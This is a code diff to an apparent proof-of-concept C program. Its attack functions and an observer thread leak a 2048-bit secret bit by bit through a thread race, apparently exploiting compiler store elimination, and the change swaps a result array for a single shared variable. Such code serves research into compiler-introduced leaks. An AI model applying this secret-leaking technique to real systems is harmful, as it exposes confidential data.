@@ -26,7 +26,7 @@ static volatile bool alwaysFalse = false;
 static volatile bool observer_exit = false;
 static pthread_barrier_t barrier;
 static unsigned x;
-static unsigned char a[2048];
+static unsigned r;
 
 // attack function for gcc (i.e. not clang/llvm)
 #if !defined(__clang__) && !defined(__llvm__)
@@ -47,10 +47,10 @@ static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t iters) { \
   /* waste some time, but don't use a syscall like usleep().                 */ \
   /* If we use a syscall, gcc wants to do the x=1 store first, regardless.   */ \
   volatile int v = 0; \
-  volatile unsigned char* a_vol = &a[bitnum];  /* volatile so we keep reloading */ \
+  volatile unsigned *r_vol = &r;  /* volatile so we keep reloading */ \
   do { \
     v++; \
-    if(*a_vol > 0) break; /* quit early if observer has already gotten something */ \
+    if(*r_vol > 0) break; /* quit early if observer has already gotten something */ \
   } while(--iters > 0); \
  \
   if(alwaysFalse) { \
@@ -105,13 +105,14 @@ void (*attackfunc_array[2048])(uint64_t);
 // returns the guessed value of the bit
 static bool leakSingleBit(unsigned bitnum, uint64_t iters) {
   x = 0;
+  r = 0;  // ensure we properly wait for observer's result than than possibly reading last time's result
 
   pthread_barrier_wait(&barrier);  // tell observer to start
 
   attackfunc_array[bitnum](iters);
 
   // use a volatile pointer so that it keeps reloading for real
-  volatile unsigned char* result = &a[bitnum];
+  volatile unsigned *result = &r;
   unsigned char retval;
   do { retval = *result; } while(retval == 0);  // wait until result is nonzero
 
@@ -124,17 +125,12 @@ static void* observer(void* dummy) {
   // but we don't want x itself to be volatile, because then DSE isn't allowed
   volatile unsigned* x_vol = &x;
 
-  unsigned index = 0;
-
   // loop until main thread tells us to exit
   while(!observer_exit) {
     pthread_barrier_wait(&barrier);
 
     // wait until we observe either x==1 or x==2
-    do { a[index] = *x_vol; } while(a[index] == 0);
-
-    index++;  // having recorded one slot of a, move to the next slot
-    if(index >= 2048) index = 0;
+    do { r = *x_vol; } while(r == 0);
   }
   return 0;
 }
@@ -151,8 +147,6 @@ static uint64_t* leak2048bitSecret(uint64_t iters, unsigned error_runs) {
   memset(finalLeakedSecret, 0xff, 32*sizeof(uint64_t));
 
   do {
-    memset(a, 0, 2048*sizeof(unsigned char));  // this ensures that leakSingleBit properly waits for observer's result
-                                               // rather than possibly reading last time's result
     for(unsigned which_64t = 0; which_64t < 32; which_64t++) {
       uint64_t leakedSecret = 0;  // just the 64 bits we're operating on right now
       for(unsigned bitnum = 0; bitnum < 64; bitnum++) {
